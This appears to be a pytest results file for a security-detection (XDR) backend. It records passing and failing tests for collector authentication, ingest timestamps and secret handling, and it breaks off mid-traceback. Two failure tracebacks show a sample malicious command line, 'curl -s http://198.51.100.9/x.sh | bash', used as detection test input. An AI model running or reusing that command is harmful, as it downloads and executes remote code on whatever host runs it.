@@ -1,0 +1,532 @@
+<?xml version="1.0" encoding="utf-8"?><testsuites name="pytest tests"><testsuite name="pytest" errors="13" failures="7" skipped="0" tests="112" time="24.639" timestamp="2026-10-17T14:56:13.353763+00:00" hostname="agent-env-630704a1-621f-478b-9b86-a321772d01bf"><testcase classname="" name="tests.test_collector_plane_auth" time="0.000"><error message="collection failure">tests/test_collector_plane_auth.py:52: in &lt;module&gt;
+    ADMIN_PASSWORD = __import__("os").environ['NIVXRAY_EXPORT_REQUIRED_CREDENTIAL_003']
+                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+&lt;frozen os&gt;:679: in __getitem__
+    ???
+E   KeyError: 'NIVXRAY_EXPORT_REQUIRED_CREDENTIAL_003'</error><error message="collection failure">tests/test_collector_plane_auth.py:52: in &lt;module&gt;
+    ADMIN_PASSWORD = __import__("os").environ['NIVXRAY_EXPORT_REQUIRED_CREDENTIAL_003']
+                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+&lt;frozen os&gt;:679: in __getitem__
+    ???
+E   KeyError: 'NIVXRAY_EXPORT_REQUIRED_CREDENTIAL_003'</error></testcase><testcase classname="" name="tests.test_edr_route_tenant_authority" time="0.000"><error message="collection failure">tests/test_edr_route_tenant_authority.py:39: in &lt;module&gt;
+    ADMIN_PASSWORD = __import__("os").environ['NIVXRAY_EXPORT_REQUIRED_CREDENTIAL_003']
+                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+&lt;frozen os&gt;:679: in __getitem__
+    ???
+E   KeyError: 'NIVXRAY_EXPORT_REQUIRED_CREDENTIAL_003'</error><error message="collection failure">tests/test_edr_route_tenant_authority.py:39: in &lt;module&gt;
+    ADMIN_PASSWORD = __import__("os").environ['NIVXRAY_EXPORT_REQUIRED_CREDENTIAL_003']
+                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+&lt;frozen os&gt;:679: in __getitem__
+    ???
+E   KeyError: 'NIVXRAY_EXPORT_REQUIRED_CREDENTIAL_003'</error></testcase><testcase classname="tests.test_d11_ingest_provenance" name="test_source_timestamp_is_the_sensor_observation_boundary" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_absent_source_timestamp_stays_not_observed" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_collector_receipt_boundary_records_its_own_source[received_at-collector:envelope.received_at]" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_collector_receipt_boundary_records_its_own_source[collection_timestamp-collector:envelope.collection_timestamp]" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_received_at_wins_over_collection_timestamp_by_declared_precedence" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_absent_collector_timestamp_never_borrows_the_nivx_receipt" time="0.000" /><testcase classname="tests.test_d11_ingest_provenance" name="test_direct_sensor_path_reports_not_applicable_not_not_observed" time="0.000" /><testcase classname="tests.test_d11_ingest_provenance" name="test_nivx_receipt_is_the_http_boundary_and_says_so" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_no_receipt_supplied_means_no_ingest_provenance_is_invented" time="0.000" /><testcase classname="tests.test_d11_ingest_provenance" name="test_malformed_timestamps_never_become_available[not-a-time]" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_malformed_timestamps_never_become_available[1757452888.555]" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_malformed_timestamps_never_become_available[]" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_malformed_timestamps_never_become_available[2026-13-45T99:99:99Z]" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_malformed_timestamps_never_become_available[null]" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_a_supplied_but_unreadable_value_is_missing_not_not_observed" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_a_broken_collector_outranks_the_dsm_not_observed_placeholder" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_a_placeholder_can_never_demote_a_real_measurement" time="0.000" /><testcase classname="tests.test_d11_ingest_provenance" name="test_unreadable_first_candidate_does_not_hide_a_good_second_one" time="0.000" /><testcase classname="tests.test_d11_ingest_provenance" name="test_offset_is_preserved_verbatim_and_never_rewritten" time="0.000" /><testcase classname="tests.test_d11_ingest_provenance" name="test_missing_offset_is_flagged_and_no_offset_is_assumed" time="0.000" /><testcase classname="tests.test_d11_ingest_provenance" name="test_zulu_is_accepted_and_kept_as_written" time="0.000" /><testcase classname="tests.test_d11_ingest_provenance" name="test_replayed_delivery_yields_identical_activity_time_and_event_id" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_identical_content_in_two_tenants_stays_two_events_one_activity" time="0.028" /><testcase classname="tests.test_d11_ingest_provenance" name="test_stitched_event_takes_activity_time_from_the_audit_header" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_unstitched_partial_uses_the_same_provenance_model" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_sensor_observation_is_not_observed_for_auditd_by_default" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_malformed_audit_header_is_declared_not_substituted_silently" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_no_boundary_ever_equals_another_by_substitution" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_all_eight_boundaries_are_present_and_none_is_silently_omitted" time="0.001" /><testcase classname="tests.test_d11_ingest_provenance" name="test_end_to_end_stamps_every_stage_and_keeps_d8_citations" time="0.561"><failure message="services.decoder.resource_limits.DecodeLimitExceeded: Decoder worker stopped without a complete result">def test_end_to_end_stamps_every_stage_and_keeps_d8_citations():
+&gt;       res, stored, cits = _run_pipeline(
+            envelope(SYSCALL, tenant="t-d11-e2e"),
+            stitch_lines=[SYSCALL, REAL_EXECVE, PROCTITLE])
+
+tests/test_d11_ingest_provenance.py:393: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+tests/test_d11_ingest_provenance.py:389: in _run_pipeline
+    return asyncio.run(_go())
+           ^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.11/asyncio/runners.py:190: in run
+    return runner.run(main)
+           ^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.11/asyncio/runners.py:118: in run
+    return self._loop.run_until_complete(task)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.11/asyncio/base_events.py:654: in run_until_complete
+    return future.result()
+           ^^^^^^^^^^^^^^^
+tests/test_d11_ingest_provenance.py:375: in _go
+    res = await process_event_through_pipeline(
+detection_content/xdr_pipeline.py:684: in process_event_through_pipeline
+    inv_state = await InvestigatorService.tick(
+services/investigator/orchestrator.py:233: in tick
+    exe = await cls._execute(db, state, pivot, cap, incident, understanding)
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+services/investigator/orchestrator.py:469: in _execute
+    findings, evidence_ids = await cap.execute(
+services/investigator/capabilities/endpoint.py:170: in execute
+    decoded = await run_offloaded(smart_decode, cli)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+routers/helpers/decode_offload.py:21: in run_offloaded
+    return await asyncio.shield(task)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.11/asyncio/threads.py:25: in to_thread
+    return await loop.run_in_executor(None, func_call)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.11/concurrent/futures/thread.py:58: in run
+    result = self.fn(*self.args, **self.kwargs)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+module = 'smart_decoder', name = 'smart_decode'
+args = ('/bin/bash -c curl -s http://198.51.100.9/x.sh | bash',), kwargs = {}
+timeout = 25.0
+
+    def invoke(module, name, args, kwargs, timeout=MAX_SECONDS):
+        try:
+            for value in (*args, *kwargs.values()):
+                check_input(value, max_input=_input_limit(module))
+            if len(pickle.dumps((args, kwargs), protocol=5)) &gt; 4*_input_limit(module):
+                raise DecodeLimitExceeded('Decoder argument byte limit exceeded')
+        except DecodeLimitExceeded as exc:
+            raise DecodeLimitExceeded(str(exc)) from None
+        if not _CAPACITY.acquire(blocking=False):
+            raise DecodeLimitExceeded('Decoder capacity exhausted; retry shortly', 503, 'decode_busy')
+        process = None
+        terminal_failure = False
+        parent = _CURRENT.get()
+        initial = None
+        if parent:
+            initial = Budget(total=parent.total, steps=parent.steps, deadline=parent.deadline)
+            timeout = min(timeout, max(.001, parent.deadline-time.monotonic()))
+        try:
+            with tempfile.TemporaryDirectory(prefix='nivx-decode-') as directory:
+                path = os.path.join(directory, 'result')
+                process = multiprocessing.get_context('spawn').Process(target=_child, args=(path,module,name,args,kwargs,initial), daemon=True)
+                process.start()
+                process.join(timeout)
+                if process.is_alive():
+                    terminal_failure = True
+                    _failure_diagnostic('deadline', exitcode=process.exitcode)
+                    raise DecodeLimitExceeded('Decoder exceeded worker deadline; computation stopped', 504, 'decode_timeout')
+                if process.exitcode != 0 or not os.path.exists(path):
+                    terminal_failure = True
+                    _failure_diagnostic('incomplete_result', exitcode=process.exitcode)
+&gt;                   raise DecodeLimitExceeded('Decoder worker stopped without a complete result', 503, 'decode_worker_failed')
+E                   services.decoder.resource_limits.DecodeLimitExceeded: Decoder worker stopped without a complete result
+
+services/decoder/isolated.py:127: DecodeLimitExceeded</failure></testcase><testcase classname="tests.test_d11_ingest_provenance" name="test_end_to_end_verdict_and_rule_stamps_are_appended_not_rewritten" time="0.509"><failure message="services.decoder.resource_limits.DecodeLimitExceeded: Decoder worker stopped without a complete result">def test_end_to_end_verdict_and_rule_stamps_are_appended_not_rewritten():
+&gt;       res, stored, _ = _run_pipeline(
+            envelope(SYSCALL, tenant="t-d11-e2e2"),
+            stitch_lines=[SYSCALL, REAL_EXECVE, PROCTITLE])
+
+tests/test_d11_ingest_provenance.py:435: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+tests/test_d11_ingest_provenance.py:389: in _run_pipeline
+    return asyncio.run(_go())
+           ^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.11/asyncio/runners.py:190: in run
+    return runner.run(main)
+           ^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.11/asyncio/runners.py:118: in run
+    return self._loop.run_until_complete(task)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.11/asyncio/base_events.py:654: in run_until_complete
+    return future.result()
+           ^^^^^^^^^^^^^^^
+tests/test_d11_ingest_provenance.py:375: in _go
+    res = await process_event_through_pipeline(
+detection_content/xdr_pipeline.py:684: in process_event_through_pipeline
+    inv_state = await InvestigatorService.tick(
+services/investigator/orchestrator.py:233: in tick
+    exe = await cls._execute(db, state, pivot, cap, incident, understanding)
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+services/investigator/orchestrator.py:469: in _execute
+    findings, evidence_ids = await cap.execute(
+services/investigator/capabilities/endpoint.py:170: in execute
+    decoded = await run_offloaded(smart_decode, cli)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+routers/helpers/decode_offload.py:21: in run_offloaded
+    return await asyncio.shield(task)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.11/asyncio/threads.py:25: in to_thread
+    return await loop.run_in_executor(None, func_call)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.11/concurrent/futures/thread.py:58: in run
+    result = self.fn(*self.args, **self.kwargs)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+module = 'smart_decoder', name = 'smart_decode'
+args = ('/bin/bash -c curl -s http://198.51.100.9/x.sh | bash',), kwargs = {}
+timeout = 25.0
+
+    def invoke(module, name, args, kwargs, timeout=MAX_SECONDS):
+        try:
+            for value in (*args, *kwargs.values()):
+                check_input(value, max_input=_input_limit(module))
+            if len(pickle.dumps((args, kwargs), protocol=5)) &gt; 4*_input_limit(module):
+                raise DecodeLimitExceeded('Decoder argument byte limit exceeded')
+        except DecodeLimitExceeded as exc:
+            raise DecodeLimitExceeded(str(exc)) from None
+        if not _CAPACITY.acquire(blocking=False):
+            raise DecodeLimitExceeded('Decoder capacity exhausted; retry shortly', 503, 'decode_busy')
+        process = None
+        terminal_failure = False
+        parent = _CURRENT.get()
+        initial = None
+        if parent:
+            initial = Budget(total=parent.total, steps=parent.steps, deadline=parent.deadline)
+            timeout = min(timeout, max(.001, parent.deadline-time.monotonic()))
+        try:
+            with tempfile.TemporaryDirectory(prefix='nivx-decode-') as directory:
+                path = os.path.join(directory, 'result')
+                process = multiprocessing.get_context('spawn').Process(target=_child, args=(path,module,name,args,kwargs,initial), daemon=True)
+                process.start()
+                process.join(timeout)
+                if process.is_alive():
+                    terminal_failure = True
+                    _failure_diagnostic('deadline', exitcode=process.exitcode)
+                    raise DecodeLimitExceeded('Decoder exceeded worker deadline; computation stopped', 504, 'decode_timeout')
+                if process.exitcode != 0 or not os.path.exists(path):
+                    terminal_failure = True
+                    _failure_diagnostic('incomplete_result', exitcode=process.exitcode)
+&gt;                   raise DecodeLimitExceeded('Decoder worker stopped without a complete result', 503, 'decode_worker_failed')
+E                   services.decoder.resource_limits.DecodeLimitExceeded: Decoder worker stopped without a complete result
+
+services/decoder/isolated.py:127: DecodeLimitExceeded</failure></testcase><testcase classname="tests.test_p0prod1_secret_policy" name="test_no_repository_constant_can_become_a_production_key" time="2.100" /><testcase classname="tests.test_collector_api_key_auth" name="test_only_sha256_digests_are_persisted" time="1.881" /><testcase classname="tests.test_collector_api_key_auth" name="test_no_plaintext_comparison_path_in_rbac_source" time="0.001" /><testcase classname="tests.test_collector_api_key_auth" name="test_valid_key_authorizes_read" time="5.828" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_the_policy_module_itself_holds_no_key_material" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_a_malformed_environment_is_a_configuration_error[prod]" time="0.001" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_a_malformed_environment_is_a_configuration_error[prd]" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_a_malformed_environment_is_a_configuration_error[Production]" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_a_malformed_environment_is_a_configuration_error[productionn]" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_a_malformed_environment_is_a_configuration_error[unknown]" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_a_malformed_environment_is_a_configuration_error[   ]" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_a_malformed_environment_is_a_configuration_error[PREVIEW]" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_production_must_be_declared_explicitly" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_production_refuses_a_missing_blank_or_placeholder_secret[None]" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_production_refuses_a_missing_blank_or_placeholder_secret[]" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_production_refuses_a_missing_blank_or_placeholder_secret[   ]" time="0.001" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_production_refuses_a_missing_blank_or_placeholder_secret[changeme]" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_production_refuses_a_missing_blank_or_placeholder_secret[placeholder-secret]" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_production_refuses_a_missing_blank_or_placeholder_secret[xdr-audit-master-do-not-use-in-prod]" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_production_never_derives_a_missing_key" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_production_startup_lists_every_missing_secret" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_production_refuses_a_forbidden_runtime_credential" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_an_unremovable_platform_key_is_inert_not_fatal" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_the_startup_validator_enforces_the_policy" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_preview_derivation_is_instance_rooted" time="0.001" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_distinct_purposes_produce_distinct_derived_keys" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_the_provenance_report_carries_no_key_material" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_key_rotation_is_never_reported_as_tampering" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_a_legacy_ciphertext_is_reported_not_guessed" time="0.001" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_the_application_env_holds_no_deploy_or_test_credential" time="0.000" /><testcase classname="tests.test_p0prod1_secret_policy" name="test_no_test_file_substitutes_a_default_live_credential" time="1.237"><failure message="AssertionError: /app/backend/tests/test_p0prod1_secret_policy.py must not silently fall back to the admin password&#10;assert 'ADMIN_PASSWORD' not in '&quot; in text:\...           &quot;'&#10;  &#10;  'ADMIN_PASSWORD' is contained here:&#10;      assert &quot;ADMIN_PASSWORD&quot; not in text.split(&#10;  ?           ++++++++++++++&#10;                    &quot;">def test_no_test_file_substitutes_a_default_live_credential():
+        root = pathlib.Path("/app/backend/tests")
+        this_file = pathlib.Path(__file__).resolve()
+        offenders = [str(p) for p in root.rglob("*.py")
+                     if p.resolve() != this_file
+                     and "NivxLive" + "!" in p.read_text(errors="ignore")]
+        assert offenders == [], f"a credential literal is committed: {offenders}"
+        for path in root.rglob("*.py"):
+            if path.resolve() == this_file:
+                continue          # this file IS the guard, not a consumer
+            text = path.read_text(errors="ignore")
+            if "TEST_ANALYST_NIVXLIVE_PASSWORD" in text:
+                assert ("allow_module_level=True" in text
+                        or "skip" in text), (
+                    f"{path} consumes the live credential without an explicit "
+                    f"prerequisite skip")
+&gt;               assert "ADMIN_PASSWORD" not in text.split(
+                    "TEST_ANALYST_NIVXLIVE_PASSWORD")[1][:400], (
+                    f"{path} must not silently fall back to the admin password")
+E               AssertionError: /app/backend/tests/test_p0prod1_secret_policy.py must not silently fall back to the admin password
+E               assert 'ADMIN_PASSWORD' not in '" in text:\...           "'
+E                 
+E                 'ADMIN_PASSWORD' is contained here:
+E                     assert "ADMIN_PASSWORD" not in text.split(
+E                 ?           ++++++++++++++
+E                                   "
+
+tests/test_p0prod1_secret_policy.py:292: AssertionError</failure></testcase><testcase classname="tests.test_p0prod1_secret_policy" name="test_the_live_analyst_credential_is_never_read_from_the_memory_file" time="0.099"><failure message="AssertionError: /app/backend/tests/test_p0prod1_secret_policy.py would read the live analyst credential from the memo&#10;assert 'TEST_ANALYS...IVE_PASSWORD' not in '&quot;&quot;&quot;P0-PROD-...the memo&quot;)\n'&#10;  &#10;  'TEST_ANALYST_NIVXLIVE_PASSWORD' is contained here:&#10;          if &quot;TEST_ANALYST_NIVXLIVE_PASSWORD&quot; in text:&#10;                assert (&quot;allow_module_level=True&quot; in text&#10;                        or &quot;skip&quot; in text), (&#10;                    f&quot;{path} consumes the live credential without an explicit &quot;&#10;                    f&quot;prerequisite skip&quot;)...&#10;  &#10;  ...Full output truncated (20 lines hidden), use '-vv' to show">def test_the_live_analyst_credential_is_never_read_from_the_memory_file():
+        """The nivx-live analyst credential must be injected by the test
+        environment. (An unrelated pre-existing suite reads the ADMIN
+        password from the memo; that is reported, not changed here.)"""
+        this_file = pathlib.Path(__file__).resolve()
+        for path in pathlib.Path("/app/backend").rglob("*.py"):
+            if path.resolve() == this_file:
+                continue
+            text = path.read_text(errors="ignore")
+            if "test_credentials.md" not in text:
+                continue
+&gt;           assert "TEST_ANALYST_NIVXLIVE_PASSWORD" not in text, (
+                f"{path} would read the live analyst credential from the memo")
+E           AssertionError: /app/backend/tests/test_p0prod1_secret_policy.py would read the live analyst credential from the memo
+E           assert 'TEST_ANALYS...IVE_PASSWORD' not in '"""P0-PROD-...the memo")\n'
+E             
+E             'TEST_ANALYST_NIVXLIVE_PASSWORD' is contained here:
+E                     if "TEST_ANALYST_NIVXLIVE_PASSWORD" in text:
+E                           assert ("allow_module_level=True" in text
+E                                   or "skip" in text), (
+E                               f"{path} consumes the live credential without an explicit "
+E                               f"prerequisite skip")...
+E             
+E             ...Full output truncated (20 lines hidden), use '-vv' to show
+
+tests/test_p0prod1_secret_policy.py:308: AssertionError</failure></testcase><testcase classname="tests.test_collector_api_key_auth" name="test_valid_key_reaches_ingest_handler" time="0.987" /><testcase classname="tests.test_collector_api_key_auth" name="test_wildcard_scope_is_honoured" time="0.005" /><testcase classname="tests.test_collector_api_key_auth" name="test_global_wildcard_scope_is_honoured" time="0.005" /><testcase classname="tests.test_collector_api_key_auth" name="test_last_used_is_stamped" time="0.006" /><testcase classname="tests.test_collector_api_key_auth" name="test_missing_credential_is_rejected" time="0.002" /><testcase classname="tests.test_collector_api_key_auth" name="test_malformed_key_is_rejected[]" time="0.492" /><testcase classname="tests.test_collector_api_key_auth" name="test_malformed_key_is_rejected[not-a-key]" time="0.010" /><testcase classname="tests.test_collector_api_key_auth" name="test_malformed_key_is_rejected[nvx_]" time="0.011" /><testcase classname="tests.test_collector_api_key_auth" name="test_malformed_key_is_rejected[nvx_short]" time="0.012" /><testcase classname="tests.test_collector_api_key_auth" name="test_malformed_key_is_rejected[NVX_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]" time="0.010" /><testcase classname="tests.test_collector_api_key_auth" name="test_malformed_key_is_rejected[nvx_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]" time="0.010" /><testcase classname="tests.test_collector_api_key_auth" name="test_malformed_key_is_rejected[nvx_zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz]" time="0.012" /><testcase classname="tests.test_collector_api_key_auth" name="test_malformed_key_is_rejected[nvx_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]" time="0.011" /><testcase classname="tests.test_collector_api_key_auth" name="test_malformed_key_is_rejected[nvx_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]" time="0.010" /><testcase classname="tests.test_collector_api_key_auth" name="test_malformed_key_is_rejected[bearer nvx_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]" time="0.010" /><testcase classname="tests.test_collector_api_key_auth" name="test_unknown_key_is_rejected" time="0.037" /><testcase classname="tests.test_collector_api_key_auth" name="test_missing_tenant_header_is_rejected" time="0.009" /><testcase classname="tests.test_collector_api_key_auth" name="test_revoked_key_is_rejected" time="0.011" /><testcase classname="tests.test_collector_api_key_auth" name="test_disabled_key_is_rejected" time="0.011" /><testcase classname="tests.test_collector_api_key_auth" name="test_expired_key_is_rejected" time="0.011" /><testcase classname="tests.test_collector_api_key_auth" name="test_unexpired_key_is_accepted" time="0.007" /><testcase classname="tests.test_collector_api_key_auth" name="test_malformed_expiry_never_means_never_expires" time="0.010" /><testcase classname="tests.test_collector_api_key_auth" name="test_wrong_tenant_header_is_rejected" time="0.011" /><testcase classname="tests.test_collector_api_key_auth" name="test_scope_not_granted_is_rejected" time="0.011" /><testcase classname="tests.test_collector_api_key_auth" name="test_empty_scope_is_rejected" time="0.021" /><testcase classname="tests.test_collector_api_key_auth" name="test_scope_gate_blocks_ingest_without_enroll" time="0.017" /><testcase classname="tests.test_collector_api_key_auth" name="test_invalid_jwt_does_not_fall_through_to_key_auth" time="0.004" /><testcase classname="tests.test_collector_api_key_auth" name="test_both_credentials_present_is_rejected" time="0.238"><failure message="AssertionError: {&quot;detail&quot;:&quot;HMAC key must not be empty.&quot;,&quot;request_id&quot;:&quot;nvx-4fdcd256ab65&quot;}&#10;assert 500 == 200&#10; +  where 500 = &lt;Response [500 Internal Server Error]&gt;.status_code">client = &lt;starlette.testclient.TestClient object at 0xfcdc4acbc9d0&gt;
+
+    def test_both_credentials_present_is_rejected(client):
+        raw = _mint()
+        login = client.post("/api/auth/login", json={
+            "email": os.environ["ADMIN_EMAIL"],
+            "password": os.environ["ADMIN_PASSWORD"]})
+&gt;       assert login.status_code == 200, login.text
+E       AssertionError: {"detail":"HMAC key must not be empty.","request_id":"nvx-4fdcd256ab65"}
+E       assert 500 == 200
+E        +  where 500 = &lt;Response [500 Internal Server Error]&gt;.status_code
+
+tests/test_collector_api_key_auth.py:251: AssertionError</failure></testcase><testcase classname="tests.test_xdr_webhooks" name="test_create_returns_secret_once" time="4.760"><error message="failed on setup with &quot;AssertionError: admin login failed: {&quot;detail&quot;:&quot;HMAC key must not be empty.&quot;,&quot;request_id&quot;:&quot;nvx-24c2bdf91798&quot;}&quot;">@pytest.fixture(scope="module", autouse=True)
+    def _seed():
+        # ONE client for the whole module, context-managed so the application
+        # lifespan (config validation + database init) is live for every request.
+        # Mixing a lifespan client with a second non-lifespan client puts the two
+        # on different event loops, which surfaces as a `Task ... got Future
+        # attached to a different loop` 500 rather than as a test failure.
+        global client
+        with TestClient(app) as c:
+            client = c
+&gt;           _TOKEN.append(admin_token(c))
+                          ^^^^^^^^^^^^^^
+
+tests/test_xdr_webhooks.py:61: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+client = &lt;starlette.testclient.TestClient object at 0xfbf43e527f10&gt;
+
+    def admin_token(client: TestClient) -&gt; str:
+        """Log the seeded platform administrator in and return its JWT."""
+        r = client.post("/api/auth/login", json={
+            "email": os.environ["ADMIN_EMAIL"],
+            "password": os.environ["ADMIN_PASSWORD"]})
+&gt;       assert r.status_code == 200, f"admin login failed: {r.text}"
+               ^^^^^^^^^^^^^^^^^^^^
+E       AssertionError: admin login failed: {"detail":"HMAC key must not be empty.","request_id":"nvx-24c2bdf91798"}
+
+/app/backend/tests/_verified_session.py:37: AssertionError</error></testcase><testcase classname="tests.test_xdr_webhooks" name="test_duplicate_name_rejected" time="0.000"><error message="failed on setup with &quot;AssertionError: admin login failed: {&quot;detail&quot;:&quot;HMAC key must not be empty.&quot;,&quot;request_id&quot;:&quot;nvx-24c2bdf91798&quot;}&quot;">@pytest.fixture(scope="module", autouse=True)
+    def _seed():
+        # ONE client for the whole module, context-managed so the application
+        # lifespan (config validation + database init) is live for every request.
+        # Mixing a lifespan client with a second non-lifespan client puts the two
+        # on different event loops, which surfaces as a `Task ... got Future
+        # attached to a different loop` 500 rather than as a test failure.
+        global client
+        with TestClient(app) as c:
+            client = c
+&gt;           _TOKEN.append(admin_token(c))
+                          ^^^^^^^^^^^^^^
+
+tests/test_xdr_webhooks.py:61: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+client = &lt;starlette.testclient.TestClient object at 0xfbf43e527f10&gt;
+
+    def admin_token(client: TestClient) -&gt; str:
+        """Log the seeded platform administrator in and return its JWT."""
+        r = client.post("/api/auth/login", json={
+            "email": os.environ["ADMIN_EMAIL"],
+            "password": os.environ["ADMIN_PASSWORD"]})
+&gt;       assert r.status_code == 200, f"admin login failed: {r.text}"
+               ^^^^^^^^^^^^^^^^^^^^
+E       AssertionError: admin login failed: {"detail":"HMAC key must not be empty.","request_id":"nvx-24c2bdf91798"}
+
+/app/backend/tests/_verified_session.py:37: AssertionError</error></testcase><testcase classname="tests.test_xdr_webhooks" name="test_test_delivery_delivered_when_upstream_ok" time="0.000"><error message="failed on setup with &quot;AssertionError: admin login failed: {&quot;detail&quot;:&quot;HMAC key must not be empty.&quot;,&quot;request_id&quot;:&quot;nvx-24c2bdf91798&quot;}&quot;">@pytest.fixture(scope="module", autouse=True)
+    def _seed():
+        # ONE client for the whole module, context-managed so the application
+        # lifespan (config validation + database init) is live for every request.
+        # Mixing a lifespan client with a second non-lifespan client puts the two
+        # on different event loops, which surfaces as a `Task ... got Future
+        # attached to a different loop` 500 rather than as a test failure.
+        global client
+        with TestClient(app) as c:
+            client = c
+&gt;           _TOKEN.append(admin_token(c))
+                          ^^^^^^^^^^^^^^
+
+tests/test_xdr_webhooks.py:61: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+client = &lt;starlette.testclient.TestClient object at 0xfbf43e527f10&gt;
+
+    def admin_token(client: TestClient) -&gt; str:
+        """Log the seeded platform administrator in and return its JWT."""
+        r = client.post("/api/auth/login", json={
